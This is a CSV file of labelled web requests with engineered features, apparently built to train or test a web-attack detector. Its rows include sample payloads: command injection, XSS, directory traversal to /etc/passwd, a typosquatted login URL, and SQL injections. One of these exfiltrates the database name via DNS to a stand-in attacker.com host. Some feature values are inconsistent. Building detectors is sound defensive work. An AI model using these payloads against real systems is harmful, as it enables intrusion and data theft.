timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-24 08:38:40,172.16.0.53,192.168.1.1,https,get,/ping?ip=127.0.0.1&& ls -la,"{""Host"":""185.199.108.153"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,500,1447,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,&& ls -la,command_injection,8,1,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,BurpSuite/2023.12,*/*,text/html,nginx,27,3,9,0,0,1,0,1,0,1,0,9,0,2,0,0,0,0,0,&& ls -la,5xx,1,0,0,160.77777777777777,0,9,160.77777777777777,13,0.6153846153846154,0,997,619,1,0,0,17,nginx,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.2222222222222222,0.1111111111111111,0,0,0,1,0,2026-03-24 08:38:00,1,0.5384615384615384
2026-03-19 03:47:00,10.0.0.107,185.199.108.153,https,post,/comment,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=%27%3B%3Cscript%3Ealert%281%29%3C/script%3E,404,2162,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,';<script>alert(1)</script>,xss,3,3,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx,8,0,1,0,0,0,0,0,0,0,0,27,51,6,0,2,0,0,0,';<script>alert(1)</script>comment=%27%3B%3Cscript%3Ealert%281%29%3C/script%3E,4xx,1,0,0,80.07407407407408,0,78,27.71794871794872,12,0.5833333333333334,0,961,575,0,1,0,91,nginx,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.2222222222222222,0.0,0,0,0,1,0,2026-03-19 03:47:00,1,0.5
2026-03-19 18:34:16,198.51.100.234,185.199.108.153,https,get,/contact?sort=books&order=desc&sort=price;desc,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,1767,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,18,3,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx,46,3,7,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1767.0,6,0.8333333333333334,0,961,575,0,1,0,81,nginx,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.06521739130434782,0,0,0,1,0,2026-03-19 18:34:00,1,0.6666666666666666
2026-03-16 23:21:18,10.0.0.69,3.12.45.78,http,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,500,410,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,23,0,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,BurpSuite/2023.12,*/*,text/html,Apache,69,1,8,1,0,0,0,0,0,0,0,59,0,5,1,0,0,0,0,"' and load_file(concat('\\',database(),'.attacker.com\'))--",5xx,1,0,0,6.9491525423728815,0,59,6.9491525423728815,7,0.5714285714285714,0,951,546,1,0,0,17,Apache,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0847457627118644,0.014492753623188406,0,0,0,1,1,2026-03-16 23:21:00,1,0.5714285714285714
2026-03-14 18:16:39,10.0.0.32,10.0.0.1,https,get,https://amazon-order-confirmation.net/login,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,2359,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,amazon-order-confirmation.net,typosquatting_url_spoofing,18,5,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS,43,0,6,0,0,0,0,0,0,0,0,29,0,0,0,1,0,0,0,amazon-order-confirmation.net,2xx,0,1,0,81.34482758620689,0,29,81.34482758620689,13,0.7692307692307693,0,998,578,0,1,0,80,IIS,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-14 18:16:00,1,0.3076923076923077
2026-03-11 15:34:30,10.0.0.26,203.0.113.45,http,get,/view?path=../../../../etc/passwd%00.jpg,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,429,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,../../../../etc/passwd.jpg,directory_traversal,15,2,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache,40,1,17,0,0,0,1,0,0,0,0,26,0,0,0,0,0,0,0,../../../../etc/passwd.jpg,4xx,1,0,0,16.5,0,26,16.5,11,0.6363636363636364,0,1028,611,0,1,0,91,Apache,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.025,0,0,0,1,1,2026-03-11 15:34:00,1,0.5454545454545454
2026-03-19 12:28:01,192.168.1.78,3.12.45.78,https,get,/login,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,1331,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,12,3,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1331.0,15,0.4,0,951,546,0,0,0,75,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-19 12:28:00,1,0.26666666666666666
2026-03-14 07:04:09,172.16.0.116,104.18.24.12,http,get,"/search?q=' and extractvalue(1,concat(0x7e,database()))--","{""Host"":""172.67.128.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,500,5165,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,"' and extractvalue(1,concat(0x7e,database()))--",sql_injection,7,5,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Nmap Scripting Engine,*/*,text/html,Apache,57,1,5,1,0,0,0,0,0,0,0,47,0,1,0,0,0,0,1,"' and extractvalue(1,concat(0x7e,database()))--",5xx,1,0,0,109.8936170212766,0,47,109.8936170212766,7,0.5714285714285714,0,986,617,1,0,0,21,Apache,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.02127659574468085,0.017543859649122806,0,0,0,1,1,2026-03-14 07:04:00,1,0.2857142857142857
2026-03-13 04:54:12,172.16.0.233,52.45.123.89,https,post,/comment,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=javascript%3Aalert%28%27DOM%20XSS%27%29,403,7034,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,javascript:alert('dom xss'),xss,4,4,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS,8,0,1,0,0,0,0,0,0,0,0,27,47,2,0,3,0,0,0,javascript:alert('dom xss')comment=javascript%3Aalert%28%27DOM%20XSS%27%29,4xx,1,0,0,260.51851851851853,0,74,95.05405405405405,12,0.6666666666666666,0,993,582,0,1,0,91,IIS,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.07407407407407407,0.0,0,0,0,1,0,2026-03-13 04:54:00,1,0.5833333333333334
2026-03-21 18:54:46,10.0.0.169,3.12.45.78,http,get,/blog?select=all,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,1482,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,18,5,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare,16,1,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1482.0,11,0.45454545454545453,0,951,546,0,1,0,80,Cloudflare,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0625,0,0,0,1,0,2026-03-21 18:54:00,1,0.36363636363636365
